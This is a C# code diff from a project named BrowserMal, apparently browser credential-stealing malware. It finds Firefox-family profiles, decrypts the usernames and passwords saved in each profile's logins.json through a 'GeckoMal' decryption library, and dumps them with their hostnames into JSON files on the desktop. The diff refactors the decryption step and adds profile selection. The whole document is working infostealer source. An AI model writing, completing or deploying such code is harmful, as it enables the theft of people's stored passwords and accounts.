@@ -4,6 +4,7 @@ using Newtonsoft.Json;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
+using GeckoMal;
 
 namespace BrowserMal.Manager
 {
@@ -30,31 +31,34 @@ namespace BrowserMal.Manager
                     continue;
 
                 List<string> profiles = GetAllProfiles(browser.Location);
-                List<CredentialModel> creds = FetchFiles(profiles, browser.Name);
+                List<CredentialModel> creds = FetchFiles(profiles, browser.Name, browser.ProfileName);
+
+                if (creds.Count == 0)
+                    continue;
 
                 Filesaver.FileManager.Save<CredentialModel>(creds, @"C:\Users\USER\Desktop\passwordsBro", $"{browser.Name}_logins.json");
             }
 
         }
-        Encryption.GeckoDecryption geckoDecryption;
-        private List<CredentialModel> FetchFiles(List<string> profiles, string name)
+        //Encryption.GeckoDecryption geckoDecryption;
+        private List<CredentialModel> FetchFiles(List<string> profiles, string name, string specificProfile)
         {
             List<CredentialModel> result = new List<CredentialModel>();
 
-            foreach (string profile in profiles)
+            /*foreach (string profile in profiles)
             {
                 string loginFile = Path.Combine(profile, "logins.json");
 
                 if (File.Exists(loginFile))
                 {
-                    if (profile.Contains("dev"))
+                    if (profile.Contains(specificProfile))
                     {
                         geckoDecryption = new Encryption.GeckoDecryption();
                         geckoDecryption.Init(profile, name);
                         break;
                     }
                 }
-            }
+            }*/
 
             foreach (string profile in profiles)
             {
@@ -62,8 +66,11 @@ namespace BrowserMal.Manager
 
                 if (File.Exists(loginFile))
                 {
-                    if (!loginFile.Contains("dev"))
+                    if (!loginFile.Contains(specificProfile))
                         continue;
+
+                    GeckoMal.Encryption encryption = new GeckoMal.Encryption();
+                    encryption.Init(profile, name);
                     /*geckoDecryption = new Encryption.GeckoDecryption();
                     geckoDecryption.Init(profile, name);*/
 
@@ -77,14 +84,14 @@ namespace BrowserMal.Manager
 
                     foreach (GeckoLoginData login in geckoLogin.logins) 
                     {
-                        string username = geckoDecryption.Decrypt(login.encryptedUsername);
-                        string password = geckoDecryption.Decrypt(login.encryptedPassword);
+                        string username = encryption.Decrypt(login.encryptedUsername);
+                        string password = encryption.Decrypt(login.encryptedPassword);
                         string hostname = login.hostname;
 
                         result.Add(new CredentialModel(hostname, username, password));
                     }
 
-                    //geckoDecryption.Unload();
+                    encryption.Unload();
 
                     break;
                 }
